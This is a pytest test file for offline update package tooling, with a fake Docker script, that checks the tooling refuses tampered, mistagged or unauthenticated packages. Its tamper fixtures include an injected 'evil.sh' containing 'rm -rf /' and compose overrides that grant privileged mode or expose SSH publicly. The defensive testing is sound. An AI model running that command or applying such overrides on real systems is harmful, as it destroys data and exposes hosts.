"""Offline update package tooling (scripts/offline/offline_package.py).

MOCK VERIFIED ONLY: ``docker`` is a stateful recording fake on PATH (there is
no Docker daemon in CI / Cloud). It keeps an image store (tags, image IDs,
layer lists), writes and reads REAL docker-archive tar files for ``save`` /
``load``, and models the application and database containers (image, env,
published ports, start time). git, tar, SHA-256 and ssh-keygen signatures are
real. What a real Docker engine / Compose does with these commands is NOT
verified here: docs/review/PHASE12D3_WINDOWS_ACCEPTANCE_CHECKLIST.md.
"""

from __future__ import annotations

import collections
import copy
import hashlib
import http.server
import io
import json
import os
import shutil
import subprocess
import sys
import tarfile
import threading
from pathlib import Path

import pytest

ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(ROOT / "scripts" / "offline"))

import offline_package as OP  # noqa: E402


def _image_config(seed: str) -> str:
    """A minimal image config blob; its SHA-256 is the classic-store image ID."""
    layers = [
        "sha256:" + hashlib.sha256(f"{seed}-layer-{i}".encode()).hexdigest()
        for i in range(3)
    ]
    return json.dumps(
        {
            "architecture": "amd64",
            "os": "linux",
            "rootfs": {"type": "layers", "diff_ids": layers},
        },
        sort_keys=True,
    )


def _config_id(config: str) -> str:
    return "sha256:" + hashlib.sha256(config.encode()).hexdigest()


NEW_CONFIG, OLD_CONFIG, NEXT_CONFIG, OTHER_CONFIG = (
    _image_config(s) for s in ("new", "old", "next", "other")
)
IMAGE_ID, OLD_ID, NEXT_ID, OTHER_ID = (
    _config_id(c) for c in (NEW_CONFIG, OLD_CONFIG, NEXT_CONFIG, OTHER_CONFIG)
)
DB_IMAGE_ID = "sha256:" + "d" * 64
TARGET = "chatbot5400:1.3.0-rc.1"

FAKE_DOCKER = r"""#!/usr/bin/env python3
import hashlib, io, json, os, re, sys, tarfile
state_path = os.environ["FAKE_DOCKER_STATE"]
state = json.load(open(state_path))
argv = sys.argv[1:]
with open(state["log"], "a") as log:
    log.write(json.dumps(argv) + "\n")
def save():
    json.dump(state, open(state_path, "w"))
def out(x):
    sys.stdout.write(x if isinstance(x, str) else json.dumps(x)); sys.stdout.write("\n")
def image_id(ref):
    if ref in state["images"]: return state["images"][ref]
    if ref in state["image_configs"]: return ref
    return None
def layers(iid):
    return json.loads(state["image_configs"][iid])["rootfs"]["diff_ids"]
APP, DB = "open_notebook", "surrealdb"
if argv[:2] == ["image", "inspect"]:
    iid = image_id(argv[-1])
    if iid is None: sys.exit(1)
    if "--format" in argv:
        out(iid + " " + json.dumps(layers(iid))); sys.exit(0)
    out([{"Id": iid, "Os": "linux", "Architecture": state.get("arch", "amd64"),
          "Created": "2026-11-17T00:00:00Z", "Config": {"Labels": state.get("labels", {})}}]); sys.exit(0)
if argv[0] == "info":
    out({"{{.Architecture}}": "x86_64", "{{.DockerRootDir}}": state["root"], "{{.OSType}}": "linux"}[argv[-1]]); sys.exit(0)
if argv[0] == "run" and "inventory" in argv:
    out(state["inventory"]); sys.exit(0)
if argv[0] == "tag":
    iid = image_id(argv[1])
    if iid is None: sys.exit(1)
    state["images"][argv[2]] = iid; save(); sys.exit(0)
if argv[0] == "save":
    if state.get("save_rc"): sys.exit(state["save_rc"])
    path, ref = argv[2], argv[3]
    config = state["image_configs"][image_id(ref)].encode()
    name = hashlib.sha256(config).hexdigest() + ".json"
    manifest = json.dumps([{"Config": name, "RepoTags": state.get("save_tags") or [ref], "Layers": ["l0/layer.tar"]}]).encode()
    with tarfile.open(path, "w") as tar:
        for n, data in (("manifest.json", manifest), (name, config), ("l0/layer.tar", b"layer" * 4000)):
            info = tarfile.TarInfo(n); info.size = len(data); tar.addfile(info, io.BytesIO(data))
    sys.exit(0)
if argv[0] == "load":
    with tarfile.open(argv[2]) as tar:
        entry = json.load(tar.extractfile("manifest.json"))[0]
        config = tar.extractfile(entry["Config"]).read()
    iid = "sha256:" + hashlib.sha256(config).hexdigest()
    if state.get("store") == "containerd":  # another image store: another image ID, same layers
        iid = "sha256:" + hashlib.sha256(b"containerd-manifest:" + config).hexdigest()
    state["image_configs"][iid] = config.decode()
    for tag in entry["RepoTags"]: state["images"][tag] = iid
    save(); out("Loaded image: " + ", ".join(entry["RepoTags"])); sys.exit(0)
if argv[0] == "inspect":
    c = state["containers"].get(argv[-1])
    if not c: sys.exit(1)
    if "--format" in argv:
        fmt = argv[argv.index("--format") + 1]
        if fmt == "{{.Image}}": out(c["image_id"])
        elif fmt == "{{.Config.Image}}": out(c["image"])
        elif fmt == "{{json .NetworkSettings.Ports}}": out(c.get("ports", {}))
        elif fmt == "{{json .Config.Env}}": out(["%s=%s" % kv for kv in sorted(c.get("env", {}).items())])
        sys.exit(0)
    out([{"Id": c["id"], "Image": c["image_id"], "Mounts": c.get("mounts", []),
          "State": {"StartedAt": c.get("started_at"), "Running": c.get("running", True)}}]); sys.exit(0)
if argv[0] == "compose":
    files = [argv[i + 1] for i, a in enumerate(argv) if a == "-f"]
    i = 1
    while i < len(argv) and argv[i] in ("-p", "-f", "--project-directory"): i += 2
    rest = argv[i:]
    def effective():
        cfg = json.loads(json.dumps(state["config"]))
        app = cfg["services"][APP]
        for f in files:
            name = os.path.basename(f)
            text = open(f).read() if os.path.exists(f) else ""
            m = re.search(r'^\s+image: "?([^"\n]+)"?\s*$', text, re.M)
            if m: app["image"] = m.group(1)
            if "pull_policy: never" in text: app["pull_policy"] = "never"
            block = re.search(r"environment:\n((?:\s+[A-Z0-9_]+: .*\n?)+)", text)
            if block:
                env = app.setdefault("environment", {})
                for line in block.group(1).splitlines():
                    k, v = line.strip().split(": ", 1); env[k] = v.strip('"')
            if "maintenance" in name:
                for p in app["ports"]: p["host_ip"] = "127.0.0.1"
            if name.startswith("evil-db") or "x-evil-db" in text: cfg["services"][DB]["image"] = "surrealdb/surrealdb:v3"
            if name.startswith("evil-app"): app["privileged"] = True
            if name.startswith("evil-env"): app.setdefault("environment", {})["SURREAL_URL"] = "ws://elsewhere:8000"
            if name.startswith("evil-volume"): cfg.setdefault("volumes", {})["other"] = {}
            if name.startswith("evil-port"): app["ports"].append({"target": 22, "published": "2222", "host_ip": "0.0.0.0"})
        return cfg
    if rest[:1] == ["config"]: out(effective()); sys.exit(0)
    if rest[:2] == ["ps", "-q"]:
        key = {APP: "c1", DB: "db1"}.get(rest[2])
        out(key if key in state["containers"] else ""); sys.exit(0)
    if rest[:2] == ["exec", "-T"]:
        cmd = rest[3:]
        joined = " ".join(cmd)
        running = state["containers"]["c1"]["image_id"]
        for needle in state.get("fail", []) + state.get("fail_on_image", {}).get(running, []):
            if re.search(needle, joined): sys.exit(1)
        if cmd[:1] == ["cat"]: out(state["versions"].get(running, state["version"])); sys.exit(0)
        if "get_latest_version" in joined: out(str(state["schema"])); sys.exit(0)
        if "TABLES =" in joined: out(json.dumps(state["counts"])); sys.exit(0)
        if "command WHERE" in joined: out(str(state["jobs"])); sys.exit(0)
        if "import_rapidocr_weights" in joined: out(json.dumps(state["rapidocr"])); sys.exit(0)
        if "ARTIFACTS" in joined: out("ARTIFACTS " + json.dumps(state["artifacts"])); sys.exit(0)
        sys.exit(0)
    if rest[:1] == ["up"]:
        app = effective()["services"][APP]
        iid = image_id(app["image"])
        if iid is None: sys.stderr.write("pull access denied (pull_policy never)\n"); sys.exit(1)
        state["ups"] = state.get("ups", 0) + 1
        ports = {"%s/tcp" % p["target"]: [{"HostIp": p.get("host_ip", "0.0.0.0"), "HostPort": str(p["published"])}]
                 for p in app.get("ports", [])}
        state["containers"]["c1"] = {"id": "app-container-%d" % state["ups"], "image": app["image"], "image_id": iid,
                                     "env": app.get("environment", {}), "ports": ports}
        if state.get("up_recreates_db"):
            state["containers"]["db1"]["id"] = "db-container-recreated"
            state["containers"]["db1"]["started_at"] = "2026-11-18T09:00:00Z"
        state.update(state.get("on_up", {}))
        save(); sys.exit(0)
    sys.exit(0)
sys.exit(0)
"""


@pytest.fixture
def fake_docker(tmp_path, monkeypatch):
    bin_dir = tmp_path / "bin"
    bin_dir.mkdir()
    docker = bin_dir / "docker"
    docker.write_text(FAKE_DOCKER)
    docker.chmod(0o755)
    state = {
        "log": str(tmp_path / "docker.log"),
        "root": str(tmp_path),
        "images": {
            "chatbot5400:local": OLD_ID,
            TARGET: IMAGE_ID,
            "chatbot5400:1.3.1": NEXT_ID,
        },
        "image_configs": {
            OLD_ID: OLD_CONFIG,
            IMAGE_ID: NEW_CONFIG,
            NEXT_ID: NEXT_CONFIG,
        },
        "labels": {},
        "containers": {
            "c1": {
                "id": "app-container-0",
                "image": "chatbot5400:local",
                "image_id": OLD_ID,
                "env": {"SURREAL_URL": "ws://surrealdb:8000/rpc"},
                "ports": {"8502/tcp": [{"HostIp": "0.0.0.0", "HostPort": "8502"}]},
            },
            "db1": {
                "id": "db-container-original",
                "image": "surrealdb/surrealdb:v2",
                "image_id": DB_IMAGE_ID,
                "mounts": [
                    {"Type": "volume", "Name": "cb_surreal", "Destination": "/mydata"}
                ],
                "started_at": "2026-11-01T08:00:00Z",
                "running": True,
            },
        },
        "version": "1.2.0",
        "versions": {OLD_ID: "1.2.0", IMAGE_ID: "1.3.0", NEXT_ID: "1.3.1"},
        "schema": 33,
        "jobs": 0,
        "counts": {
            "source": 120,
            "notebook": 7,
            "note": 31,
            "source_embedding": 5400,
            "source_insight": 12,
        },
        "rapidocr": {
            "copied": {"det.onnx": "existing", "rec.onnx": "imported"},
            "on_volume": [["det.onnx", 10], ["rec.onnx", 20]],
        },
        "artifacts": {
            "ocr_models": [
                ["easyocr/craft_mlt_25k.pth", 83152330],
                ["rapidocr/det.onnx", 10],
                ["rapidocr/rec.onnx", 20],
                ["tesseract/best/vie.traineddata", 11000000],
                ["tesseract/custom/agri/2026.10.1/vie_agri.traineddata", 9000000],
                ["tesseract/fast/osd.traineddata", 10562727],
                ["tesseract/fast/vie.traineddata", 530000],
            ],
            "huggingface_hub": [
                [
                    "models--docling-project--docling-layout-heron/snapshots/a/model.safetensors",
                    171000000,
                ],
                [
                    "models--docling-project--docling-models/snapshots/b/model_artifacts/tableformer/accurate/tableformer_accurate.safetensors",
                    213000000,
                ],
            ],
        },
        "inventory": {
            "app_version": "1.3.0",
            "schema_version": 33,
            "python": "3.12",
            "dependencies": {
                "docling": "2.129.0",
                "docling-core": "2.96.0",
                "content-core": "2.0.7",
            },
            "tesseract": "tesseract 5.5.0",
            "runtimes_baked": {
                "docling": True,
                "easyocr": True,
                "tesseract": True,
                "tiktoken_offline": True,
            },
            "runtime_artifacts": {
                "rapidocr_weights_sha256": {},
                "tiktoken": {"encoding": "o200k_base", "loads_offline": True},
            },
        },
        "config": {
            "services": {
                "open_notebook": {
                    "image": "chatbot5400:local",
                    "environment": {"SURREAL_URL": "ws://surrealdb:8000/rpc"},
                    "ports": [
                        {"target": 8502, "published": "8502", "host_ip": "0.0.0.0"}
                    ],
                },
                "surrealdb": {
                    "image": "surrealdb/surrealdb:v2",
                    "volumes": [{"source": "cb_surreal", "target": "/mydata"}],
                },
            },
            "volumes": {"cb_surreal": {}},
        },
    }
    state_path = tmp_path / "docker_state.json"
    state_path.write_text(json.dumps(state))
    monkeypatch.setenv("FAKE_DOCKER_STATE", str(state_path))
    monkeypatch.setenv("PATH", f"{bin_dir}{os.pathsep}{os.environ['PATH']}")

    class Fake:
        path = state_path

        def get(self):
            return json.loads(state_path.read_text())

        def set(self, **kw):
            s = self.get()
            s.update(kw)
            state_path.write_text(json.dumps(s))

        def edit(self, fn):
            s = self.get()
            fn(s)
            state_path.write_text(json.dumps(s))

        def calls(self):
            log = Path(self.get()["log"])
            return (
                [json.loads(x) for x in log.read_text().splitlines()]
                if log.is_file()
                else []
            )

        def forget_image(self, tag):
            """The server never saw this image: only ``docker load`` brings it."""

            def drop(s):
                iid = s["images"].pop(tag, None)
                if iid and iid not in s["images"].values():
                    s["image_configs"].pop(iid, None)

            self.edit(drop)

        def app(self):
            return self.get()["containers"]["c1"]

    return Fake()


def _git(checkout: Path, *a: str) -> str:
    return subprocess.run(
        ["git", "-C", str(checkout), *a], check=True, capture_output=True, text=True
    ).stdout.strip()


@pytest.fixture
def repo(tmp_path):
    r = tmp_path / "repo"
    r.mkdir()
    _git(r, "init", "-q", "-b", "main")
    _git(r, "config", "user.email", "t@example.invalid")
    _git(r, "config", "user.name", "t")
    (r / "VERSION").write_text("1.2.0\n")
    (r / "README.md").write_text("ChatBot5400\n")
    (r / "app.py").write_text("print('v1.2.0')\n")
    _git(r, "add", ".")
    _git(r, "commit", "-qm", "v1.2.0")
    _git(r, "tag", "v1.2.0")
    (r / "VERSION").write_text("1.3.0\n")
    (r / "app.py").write_text("print('v1.3.0')\n")
    (r / "docs" / "deployment").mkdir(parents=True)
    (r / "docs" / "deployment" / "OFFLINE_UPDATE_UBUNTU_GUIDE.md").write_text(
        "# guide\n"
    )
    _git(r, "add", ".")
    _git(r, "commit", "-qm", "phase 12")
    return r


def _build_rc(repo, out, *extra, version="1.3.0-rc.1"):
    return OP.main(
        ["build", "--version", version, "--image", f"chatbot5400:{version}",
         "--repo", str(repo), "--out", str(out), *extra]
    )  # fmt: skip


def _build(repo, tmp_path, *extra, version="1.3.0-rc.1", out="dist"):
    out_dir = tmp_path / out
    assert _build_rc(repo, out_dir, *extra, version=version) == 0
    pkg = next(out_dir.glob("*.tar.gz"))
    return pkg, OP.sha256_file(pkg)


@pytest.fixture
def package(fake_docker, repo, tmp_path):
    return _build(repo, tmp_path)


def _verify(pkg, dest, *extra):
    return OP.main(
        ["verify", str(pkg), "--extract-to", str(dest), "--platform", "linux/amd64", *extra]
    )  # fmt: skip


def _manifest_of(pkg):
    with tarfile.open(pkg) as t:
        top = t.getnames()[0].split("/")[0]
        return json.loads(t.extractfile(f"{top}/manifest.json").read())


# --------------------------------------------------------------------------- #
# build (F-04, F-05, F-27)
# --------------------------------------------------------------------------- #


def test_build_uses_docker_save_and_git_bundle(package, fake_docker, repo):
    pkg, _ = package
    calls = fake_docker.calls()
    assert any(c[0] == "save" for c in calls)
    assert not any(
        c[0] in ("export", "push", "pull", "login", "build", "buildx") for c in calls
    )
    run_call = next(c for c in calls if c[0] == "run")
    assert run_call[run_call.index("--network") + 1] == "none"
    names = tarfile.open(pkg).getnames()
    top = names[0].split("/")[0]
    for rel in (
        "manifest.json", "SHA256SUMS", "images/chatbot5400-1.3.0-rc.1.tar",
        "source/chatbot5400-1.3.0-rc.1.bundle", "scripts/update.sh", "scripts/pin.sh",
        "scripts/offline_package.py",
    ):  # fmt: skip
        assert f"{top}/{rel}" in names
    manifest = _manifest_of(pkg)
    assert manifest["package_format_version"] == 2
    image = manifest["image"]
    assert image["id"] == IMAGE_ID and image["config_digest"] == IMAGE_ID
    assert image["diff_ids"] == json.loads(NEW_CONFIG)["rootfs"]["diff_ids"]
    assert image["repo_tags"] == [TARGET]
    assert manifest["database"] == {
        "schema_version": 33,
        "migration_required": False,
        "compatible_schema_versions": [33],
    }
    assert manifest["readiness"]["status"] == "READY"
    src = manifest["source"]
    assert src["base_ref"] == "v1.2.0"
    assert src["commit"] == _git(repo, "rev-parse", "HEAD")
    assert src["base_commit"] == _git(repo, "rev-parse", "v1.2.0")
    assert src["bundle_ref"] == "refs/cb5400-offline/build/1.3.0-rc.1"
    blob = json.dumps(manifest).lower()
    for word in ("password", "api_key", "secret=", ".env"):
        assert word not in blob


def test_build_bundle_carries_a_named_ref_and_leaves_no_temp_ref(
    package, repo, tmp_path
):
    """F-04 / F-05: the bundle is real, verified, and names the release commit."""
    pkg, _ = package
    work = tmp_path / "unpacked"
    with tarfile.open(pkg) as t:
        t.extractall(work, filter="data")
    bundle = next(work.rglob("*.bundle"))
    _git(repo, "bundle", "verify", str(bundle))
    heads = OP.bundle_heads(repo, bundle)
    assert heads == {
        "refs/cb5400-offline/build/1.3.0-rc.1": _git(repo, "rev-parse", "HEAD")
    }
    assert _git(repo, "for-each-ref", "refs/cb5400-offline") == ""  # temp ref deleted


def test_build_accepts_a_commit_sha_and_a_ref_name(fake_docker, repo, tmp_path):
    sha = _git(repo, "rev-parse", "HEAD")
    assert _build_rc(repo, tmp_path / "a", "--git-ref", sha) == 0
    assert _build_rc(repo, tmp_path / "b", "--git-ref", "main") == 0
    assert _build_rc(repo, tmp_path / "c", "--git-ref", "no-such-ref") == OP.EXIT_USAGE


@pytest.mark.parametrize("requested", ["1.4.0", "1.3.1-rc.1", "2.0.0", "1.3"])
def test_build_version_mismatch_is_refused_before_any_docker_call(
    fake_docker, repo, tmp_path, requested
):
    """F-27: VERSION of the commit is 1.3.0 -> only 1.3.0 / 1.3.0-<suffix>."""
    assert _build_rc(repo, tmp_path / "dist", version=requested) == OP.EXIT_USAGE
    assert fake_docker.calls() == []
    assert not (tmp_path / "dist").exists() or not any((tmp_path / "dist").iterdir())


def test_version_rule_on_the_real_repository():
    """VERSION stays 1.2.0 in Phase 12: `1.3.0-rc.1` cannot be packaged from it."""
    assert (ROOT / "VERSION").read_text().strip() == "1.2.0"
    assert OP.version_matches("1.2.0", "1.2.0")
    assert OP.version_matches("1.2.0", "1.2.0-phase12.1")
    assert not OP.version_matches("1.2.0", "1.3.0-rc.1")
    assert not OP.version_matches("1.2.0", "1.2.1")
    assert not OP.version_matches("", "1.2.0")
    bad = OP.main(["check-version", "--version", "1.3.0-rc.1", "--repo", str(ROOT)])
    good = OP.main(
        ["check-version", "--version", "1.2.0-phase12.1", "--repo", str(ROOT)]
    )
    assert (bad, good) == (OP.EXIT_USAGE, 0)


def test_build_wrong_base_is_refused_before_any_docker_call(
    fake_docker, repo, tmp_path
):
    assert _build_rc(repo, tmp_path / "a", "--base-ref", "v9.9.9") == OP.EXIT_USAGE
    # a base that is not an ancestor of the commit (side branch)
    _git(repo, "checkout", "-q", "-b", "side", "v1.2.0")
    (repo / "side.txt").write_text("x\n")
    _git(repo, "add", ".")
    _git(repo, "commit", "-qm", "side")
    _git(repo, "checkout", "-q", "main")
    assert _build_rc(repo, tmp_path / "b", "--base-ref", "side") == OP.EXIT_USAGE
    assert fake_docker.calls() == []
    assert not list(tmp_path.glob("*/ChatBot5400-*"))
    assert _git(repo, "for-each-ref", "refs/cb5400-offline") == ""


def test_build_refuses_a_dirty_checkout_and_a_wrong_image_revision(
    fake_docker, repo, tmp_path
):
    (repo / "app.py").write_text("print('edited')\n")
    assert _build_rc(repo, tmp_path / "a") == OP.EXIT_USAGE
    _git(repo, "checkout", "--", "app.py")
    fake_docker.set(labels={"org.opencontainers.image.revision": "f" * 40})
    assert (
        _build_rc(repo, tmp_path / "b") == OP.EXIT_USAGE
    )  # image built from another commit
    assert not list(tmp_path.glob("*/ChatBot5400-*"))


def test_interrupted_build_leaves_nothing_behind_and_can_be_repeated(
    fake_docker, repo, tmp_path
):
    """F-04: no half-built stage directory blocks the next run; no temp ref stays."""
    fake_docker.set(save_rc=1)  # docker save fails (disk full, daemon stopped...)
    out = tmp_path / "dist"
    assert _build_rc(repo, out) == OP.EXIT_UPDATE
    assert not list(out.glob("ChatBot5400-*"))
    assert _git(repo, "for-each-ref", "refs/cb5400-offline") == ""
    fake_docker.set(save_rc=0)
    assert _build_rc(repo, out) == 0
    assert len(list(out.glob("*.tar.gz"))) == 1


def test_build_refuses_an_archive_with_more_tags_than_approved(
    fake_docker, repo, tmp_path
):
    fake_docker.set(save_tags=[TARGET, "chatbot5400:latest"])
    assert _build_rc(repo, tmp_path / "dist") == OP.EXIT_USAGE
    assert not list((tmp_path / "dist").glob("ChatBot5400-*"))


def test_build_marks_not_ready_without_offline_token_encoding(
    fake_docker, repo, tmp_path
):
    """F-22: an image whose tiktoken encoding needs the network is NOT_READY."""

    def no_tiktoken(s):
        s["inventory"]["runtimes_baked"]["tiktoken_offline"] = False

    fake_docker.edit(no_tiktoken)
    pkg, _ = _build(repo, tmp_path)
    readiness = _manifest_of(pkg)["readiness"]
    assert readiness["status"] == "NOT_READY"
    assert any("tiktoken" in p for p in readiness["problems"])


@pytest.fixture
def repo_with_scripts(repo):
    """The build wrappers run from the checkout they package."""
    dest = repo / "scripts" / "offline"
    dest.mkdir(parents=True)
    for f in (ROOT / "scripts" / "offline").iterdir():
        if f.is_file():
            shutil.copy2(f, dest / f.name)
    _git(repo, "add", ".")
    _git(repo, "commit", "-qm", "offline tooling")
    return repo


def test_build_package_sh_checks_the_version_before_docker(
    fake_docker, repo_with_scripts, tmp_path
):
    """F-27 through the real wrapper: nothing Docker-related runs on a mismatch."""
    script = repo_with_scripts / "scripts" / "offline" / "build-package.sh"
    proc = subprocess.run(
        ["bash", str(script), "--version", "1.4.0", "--out", str(tmp_path / "o")],
        capture_output=True, text=True,
    )  # fmt: skip
    assert proc.returncode == 2, proc.stderr
    assert fake_docker.calls() == []
    assert not (tmp_path / "o").exists()


def test_build_package_sh_builds_a_package_with_a_usable_bundle(
    fake_docker, repo_with_scripts, tmp_path
):
    """F-04 through the real wrapper (it passes the commit SHA as --git-ref)."""
    script = repo_with_scripts / "scripts" / "offline" / "build-package.sh"
    out = tmp_path / "o"
    proc = subprocess.run(
        ["bash", str(script), "--version", "1.3.0-rc.1", "--no-build", "--out", str(out)],
        capture_output=True, text=True,
    )  # fmt: skip
    assert proc.returncode == 0, proc.stdout + proc.stderr
    pkg = next(out.glob("*.tar.gz"))
    assert _manifest_of(pkg)["source"]["commit"] == _git(
        repo_with_scripts, "rev-parse", "HEAD"
    )
    assert not any(c[0] in ("buildx", "build") for c in fake_docker.calls())


def test_build_package_ps1_has_the_same_order_static():
    """PowerShell cannot run in Cloud: STATIC check only (LOCAL VERIFICATION REQUIRED)."""
    ps = (ROOT / "scripts" / "offline" / "build-package.ps1").read_text()
    check = ps.index("'check-version'")
    assert check < ps.index("docker image inspect") < ps.index("docker buildx build")
    assert "merge-base --is-ancestor" in ps and "'--repo', $Root" in ps
    sh = (ROOT / "scripts" / "offline" / "build-package.sh").read_text()
    assert (
        sh.index("check-version")
        < sh.index("docker image inspect")
        < sh.index("docker buildx build")
    )


# --------------------------------------------------------------------------- #
# verify: authenticity first, archive safety, integrity (F-14, F-25, F-26)
# --------------------------------------------------------------------------- #


def test_verify_with_trusted_hash(package, tmp_path):
    pkg, digest = package
    assert _verify(pkg, tmp_path / "x", "--expected-sha256", digest) == 0
    report = json.loads((tmp_path / "x" / "verify-report.json").read_text())
    assert report["result"] == "VERIFIED"
    assert report["package_sha256"] == digest
    pkg_dir = Path(report["package_dir"])
    assert report["manifest_sha256"] == OP.sha256_file(pkg_dir / "manifest.json")


def test_verify_refuses_without_authenticity_and_unpacks_nothing(package, tmp_path):
    pkg, _ = package
    dest = tmp_path / "x"
    assert (
        _verify(pkg, dest, "--allowed-signers", str(tmp_path / "none"))
        == OP.EXIT_VERIFY
    )
    assert not dest.exists()  # F-14: nothing is written before authentication
    assert not list(tmp_path.glob("x.partial-*"))


def test_verify_refuses_wrong_hash_and_unpacks_nothing(package, tmp_path):
    pkg, _ = package
    assert _verify(pkg, tmp_path / "x", "--expected-sha256", "0" * 64) == OP.EXIT_VERIFY
    assert not (tmp_path / "x").exists()


def test_verify_refuses_wrong_platform(package, tmp_path):
    pkg, digest = package
    rc = OP.main(
        ["verify", str(pkg), "--extract-to", str(tmp_path / "x"), "--expected-sha256", digest,
         "--platform", "linux/arm64"]
    )  # fmt: skip
    assert rc == OP.EXIT_VERIFY
    assert not (tmp_path / "x").exists()  # a refused package leaves no tree behind


def test_verify_refuses_unsupported_source_version(package, tmp_path):
    pkg, digest = package
    rc = _verify(
        pkg, tmp_path / "x", "--expected-sha256", digest, "--current-version", "1.0.8"
    )
    assert rc == OP.EXIT_VERIFY


def test_verify_refuses_newer_database(package, tmp_path):
    pkg, digest = package
    rc = _verify(
        pkg, tmp_path / "x", "--expected-sha256", digest, "--current-schema", "34"
    )
    assert rc == OP.EXIT_VERIFY


def _repack(pkg, tmp_path, mutate, refresh_manifest=False):
    """Extract (trusted test helper), mutate, repack -> new package + its hash."""
    work = tmp_path / "work"
    with tarfile.open(pkg) as t:
        t.extractall(work, filter="data")
    top = next(work.iterdir())
    mutate(top)
    if refresh_manifest:  # an attacker who can also rewrite the (unsigned) manifest
        m = json.loads((top / "manifest.json").read_text())
        m["files"] = {
            p.relative_to(top).as_posix(): {
                "sha256": OP.sha256_file(p),
                "size": p.stat().st_size,
            }
            for p in sorted(top.rglob("*"))
            if p.is_file()
            and p.name not in ("manifest.json", "manifest.json.sig", "SHA256SUMS")
        }
        m["image"]["archive_sha256"] = m["files"][m["image"]["archive"]]["sha256"]
        (top / "manifest.json").write_text(json.dumps(m))
        (top / "SHA256SUMS").write_text(OP.render_sums(m["files"]))
    tmp_path.mkdir(parents=True, exist_ok=True)
    new = tmp_path / "mutated.tar.gz"
    with tarfile.open(new, "w:gz") as t:
        t.add(top, arcname=top.name)
    return new, OP.sha256_file(new)


def test_verify_detects_corrupted_image(package, tmp_path):
    pkg, _ = package

    def corrupt(top):
        f = top / "images" / "chatbot5400-1.3.0-rc.1.tar"
        f.write_bytes(f.read_bytes() + b"x")

    new, digest = _repack(pkg, tmp_path, corrupt)
    assert _verify(new, tmp_path / "x", "--expected-sha256", digest) == OP.EXIT_VERIFY
    assert not (tmp_path / "x").exists()


def test_verify_detects_extra_and_missing_files(package, tmp_path):
    pkg, _ = package
    new, digest = _repack(
        pkg, tmp_path, lambda top: (top / "scripts" / "evil.sh").write_text("rm -rf /")
    )
    assert _verify(new, tmp_path / "x", "--expected-sha256", digest) == OP.EXIT_VERIFY
    new, digest = _repack(
        pkg, tmp_path / "b", lambda top: (top / "scripts" / "update.sh").unlink()
    )
    assert _verify(new, tmp_path / "y", "--expected-sha256", digest) == OP.EXIT_VERIFY


def test_verify_detects_invalid_manifest(package, tmp_path):
    pkg, _ = package

    def bad(top):
        m = json.loads((top / "manifest.json").read_text())
        del m["database"]
        (top / "manifest.json").write_text(json.dumps(m))

    new, digest = _repack(pkg, tmp_path, bad)
    assert _verify(new, tmp_path / "x", "--expected-sha256", digest) == OP.EXIT_VERIFY

    new, digest = _repack(
        pkg, tmp_path / "c", lambda top: (top / "manifest.json").write_text("{not json")
    )
    assert _verify(new, tmp_path / "z", "--expected-sha256", digest) == OP.EXIT_VERIFY


def test_verify_refuses_migration_packages(package, tmp_path):
    pkg, _ = package

    def mig(top):
        m = json.loads((top / "manifest.json").read_text())
        m["database"]["migration_required"] = True
        m["database"]["schema_version"] = 34
        (top / "manifest.json").write_text(json.dumps(m))

    new, digest = _repack(pkg, tmp_path, mig)
    assert _verify(new, tmp_path / "x", "--expected-sha256", digest) == OP.EXIT_VERIFY


def _image_tar(path, tags, config=NEW_CONFIG):
    name = hashlib.sha256(config.encode()).hexdigest() + ".json"
    manifest = json.dumps(
        [{"Config": name, "RepoTags": tags, "Layers": ["l0/layer.tar"]}]
    )
    with tarfile.open(path, "w") as tar:
        for n, data in (
            ("manifest.json", manifest.encode()),
            (name, config.encode()),
            ("l0/layer.tar", b"layer" * 4000),
        ):
            info = tarfile.TarInfo(n)
            info.size = len(data)
            tar.addfile(info, io.BytesIO(data))


@pytest.mark.parametrize(
    "tags",
    [
        [TARGET, "surrealdb/surrealdb:v2"],  # would MOVE the database image tag
        [TARGET, "chatbot5400:local"],  # would move the tag the deployment runs
        ["chatbot5400:something-else"],
        [],
    ],
)
def test_verify_refuses_an_image_archive_with_unapproved_tags(package, tmp_path, tags):
    """F-25: `docker load` creates / moves every RepoTag of the archive; only the
    manifest's tag is approved - even when every checksum is consistent."""
    pkg, _ = package
    new, digest = _repack(
        pkg,
        tmp_path,
        lambda top: _image_tar(top / "images" / "chatbot5400-1.3.0-rc.1.tar", tags),
        refresh_manifest=True,
    )
    assert _verify(new, tmp_path / "x", "--expected-sha256", digest) == OP.EXIT_VERIFY
    assert not (tmp_path / "x").exists()


def test_verify_refuses_an_archive_holding_another_image(package, tmp_path):
    """F-20: right tag, consistent checksums, but not the image of the manifest."""
    pkg, _ = package
    new, digest = _repack(
        pkg,
        tmp_path,
        lambda top: _image_tar(
            top / "images" / "chatbot5400-1.3.0-rc.1.tar", [TARGET], OTHER_CONFIG
        ),
        refresh_manifest=True,
    )
    assert _verify(new, tmp_path / "x", "--expected-sha256", digest) == OP.EXIT_VERIFY


def test_image_archive_identity_docker_and_oci_layouts(tmp_path):
    docker_tar = tmp_path / "d.tar"
    _image_tar(docker_tar, [TARGET])
    ident = OP.image_archive_identity(docker_tar)
    assert ident["layout"] == "docker-archive" and ident["repo_tags"] == [TARGET]
    assert ident["config_digest"] == IMAGE_ID
    assert ident["diff_ids"] == json.loads(NEW_CONFIG)["rootfs"]["diff_ids"]

    oci = tmp_path / "o.tar"
    config = NEW_CONFIG.encode()
    cfg_hex = hashlib.sha256(config).hexdigest()
    image_manifest = json.dumps(
        {"config": {"digest": f"sha256:{cfg_hex}"}, "layers": []}
    ).encode()
    man_hex = hashlib.sha256(image_manifest).hexdigest()
    index = json.dumps(
        {"manifests": [{"digest": f"sha256:{man_hex}",
                        "annotations": {"io.containerd.image.name": TARGET}}]}
    ).encode()  # fmt: skip
    with tarfile.open(oci, "w") as tar:
        for n, data in (
            ("index.json", index),
            (f"blobs/sha256/{man_hex}", image_manifest),
            (f"blobs/sha256/{cfg_hex}", config),
        ):
            info = tarfile.TarInfo(n)
            info.size = len(data)
            tar.addfile(info, io.BytesIO(data))
    ident = OP.image_archive_identity(oci)
    assert ident["layout"] == "oci" and ident["repo_tags"] == [TARGET]
    assert ident["config_digest"] == IMAGE_ID

    junk = tmp_path / "junk.tar"
    junk.write_bytes(b"not a tar")
    with pytest.raises(OP.Refused):
        OP.image_archive_identity(junk)


def test_same_image_across_image_stores():
    image = {"id": IMAGE_ID, "config_digest": IMAGE_ID,
             "diff_ids": json.loads(NEW_CONFIG)["rootfs"]["diff_ids"]}  # fmt: skip
